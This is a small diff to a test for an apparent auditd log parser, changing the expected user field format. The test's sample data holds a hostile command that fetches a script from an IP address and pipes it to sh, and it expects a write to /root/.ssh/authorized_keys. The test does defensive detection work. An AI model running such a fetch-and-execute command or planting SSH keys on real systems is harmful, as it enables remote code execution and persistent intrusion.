@@ -221,7 +221,7 @@ def test_parse_auditd_groupes_hex_et_enrichi(tmp_path):
     assert out['format'] == 'linux_auditd' and out['ref_kind'] == 'line'
     curl = next(e for e in out['events'] if 'k.sh' in (e.get('command') or ''))
     assert curl['command'] == 'sh -c curl -s http://193.142.146.35/k.sh | sh'  # EXECVE hexadecimal decode
-    assert curl['record_types'].startswith('SYSCALL+EXECVE') and curl['user'] == 'uid=33'
+    assert curl['record_types'].startswith('SYSCALL+EXECVE') and curl['user'] == 'uid:33'
     assert curl['timestamp'].startswith('2026-10-15T09:17') and curl['pid'] == '7102'
     keys = next(e for e in out['events'] if 'authorized_keys' in (e.get('target') or ''))
     assert '/root/.ssh/authorized_keys' in keys['target']  # chemin relatif resolu avec CWD
